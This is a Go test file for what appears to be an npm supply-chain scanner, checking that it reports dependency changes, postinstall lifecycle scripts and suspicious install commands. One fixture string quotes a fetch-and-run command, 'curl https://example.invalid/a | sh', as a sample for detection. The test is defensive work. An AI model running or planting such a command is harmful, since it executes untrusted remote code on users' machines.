package npmdependencies

import (
	"strings"
	"testing"

	"github.com/sourcegate/sourcegate/internal/report"
)

func TestCheckDependencyChangeReportsAddedAndRemovedNames(t *testing.T) {
	findings := CheckDependencyChange(report.PackageReport{
		Ecosystem: "npm",
		NPMDependencies: report.NPMDependencySet{
			Dependencies:         []string{"new-dep"},
			OptionalDependencies: []string{"still-optional"},
		},
		NPMDependencyHistory: []report.VersionNPMDependencies{{
			Version:           "1.0.0",
			DependenciesKnown: true,
			Dependencies: report.NPMDependencySet{
				Dependencies:         []string{"old-dep"},
				OptionalDependencies: []string{"still-optional"},
			},
		}},
	}, 5)

	if len(findings) != 1 || !strings.Contains(findings[0].Message, "new-dep") || !strings.Contains(findings[0].Message, "old-dep") {
		t.Fatalf("findings = %+v, want added and removed dependency names", findings)
	}
}

func TestDirectDependencyChecksReportLifecycleAndSuspiciousCommands(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "npm",
		NPMDirectDependencies: []report.NPMDirectDependencyInspection{{
			Name:                      "dep",
			SelectedVersion:           "1.0.0",
			LifecycleFindings:         []string{"package declares high-signal npm install lifecycle script \"postinstall\": node setup.js"},
			SuspiciousCommandFindings: []string{"npm lifecycle script \"postinstall\" has suspicious command pattern(s): direct URL: curl https://example.invalid/a | sh"},
		}},
	}

	lifecycle := CheckDirectDependencyLifecycleScripts(pkg)
	suspicious := CheckDirectDependencySuspiciousInstallCommands(pkg)
	if len(lifecycle) != 1 || !strings.Contains(lifecycle[0].Message, "dep@1.0.0") {
		t.Fatalf("lifecycle findings = %+v, want direct dependency lifecycle finding", lifecycle)
	}
	if len(suspicious) != 1 || !strings.Contains(suspicious[0].Message, "suspicious") {
		t.Fatalf("suspicious findings = %+v, want direct dependency suspicious command finding", suspicious)
	}
}

func TestDirectDependencyOverflowIsIndeterminate(t *testing.T) {
	reason := DirectDependencyIndeterminateReason(report.PackageReport{
		Ecosystem:                   "npm",
		NPMDirectDependencyLimit:    25,
		NPMDirectDependencyOverflow: 2,
	})
	if !strings.Contains(reason, "skipped 2") {
		t.Fatalf("reason = %q, want skipped dependency count", reason)
	}
}
